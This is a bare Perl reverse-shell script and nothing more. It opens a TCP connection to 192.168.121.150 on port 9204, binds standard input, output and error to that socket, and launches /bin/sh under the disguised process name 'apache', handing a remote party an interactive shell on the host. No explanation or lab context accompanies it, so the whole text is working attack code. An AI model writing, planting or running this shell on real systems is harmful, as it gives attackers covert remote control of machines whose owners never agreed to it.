use Socket;
my $ip = '192.168.121.150';
my $port = 9204;
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
connect(SOCK, sockaddr_in($port,inet_aton($ip)));
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
exec({"/bin/sh"} ("apache", "-i"));